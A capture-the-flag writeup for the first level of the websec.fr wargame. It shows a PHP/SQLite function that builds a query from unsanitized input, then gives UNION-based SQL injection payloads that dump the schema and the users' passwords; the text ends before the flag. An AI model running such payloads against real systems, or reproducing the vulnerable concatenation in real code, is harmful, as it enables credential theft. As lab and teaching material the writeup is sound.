# Websec.fr writeup

In this blog we solve the levels hosted in [websec.fr](https://websec.fr/).

As the authors describe, it "is a wargame site providing various web-based challenges". 

The levels are divided in 4 (+1) categories: babysteps, easy, medium, hard and a bonus category.

I suggest to attempt the challenges on your own before reading the solutions.

Let's start. 

## level01 - babysteps

The web application employs PHP and SQLite. In fact, if we click on *This application on the bottom* we are redirected to */source.php* and here we can read the source code. 

Analyzing it, we immediately note the vulnerable line of the code: it lies on the *LevelOne::doQuery()* function. Specifically, no sanitization is executed on the user input. 

```
class LevelOne {
    public function doQuery($injection) {
        $pdo = new SQLite3('database.db', SQLITE3_OPEN_READONLY);
        
        $query = 'SELECT id,username FROM users WHERE id=' . $injection . ' LIMIT 1'; 
        $getUsers = $pdo->query($query); //[bob01: vulnerable line: no input sanitization]
        $users = $getUsers->fetchArray(SQLITE3_ASSOC);

        if ($users) {
            return $users;
        }

        return false;
    }
}
```

As we know, each SQLite database contains a *schema table* that stores the schema for that database, i.e., *sqlite_schema* (sqlite_schema can have different name alternatives, see [link](https://www.sqlite.org/schematab.html)).

Then, by simply running an UNION query, namely:

```
-1 union select 1,sql from sqlite_master --
```

we get the following output:

![img1](/images/websec/img1.png?raw=true) 

Now, we know that the *users* table contains three columns, that are: id, username and password; we can then exploit the *GROUP_CONCAT()* function ([link](https://www.sqlitetutorial.net/sqlite-group_concat/) on how to use it):

```
-1 union select username,group_concat(password, ';') from users --
```

and get the flag:
